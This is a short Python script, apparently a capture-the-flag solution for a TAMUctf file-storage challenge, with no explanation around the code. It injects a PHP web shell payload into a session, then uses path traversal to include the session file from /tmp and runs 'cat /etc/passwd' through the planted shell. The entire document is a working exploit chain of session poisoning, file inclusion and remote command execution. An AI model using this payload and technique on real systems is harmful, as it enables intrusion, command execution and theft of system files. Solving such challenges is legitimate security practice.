import requests

url="http://filestorage.tamuctf.com/"


cookie={"PHPSESSID":"oem67ig5kgqd7nphi91j5geaf9"}

payload="<%3fphp+system($_GET['cmd'])%3b%3f>"

conn=requests.post(url,cookies=cookie,data=payload)
sd =conn.content
#print sd

cmd="cat /etc/passwd"

url2="http://filestorage.tamuctf.com/index.php?file=.../../../../../../../../../../../../tmp/sess_oem67ig5kgqd7nphi91j5geaf9&cmd="+cmd
#print url2
final=requests.get(url2,cookies=cookie)
print final.content
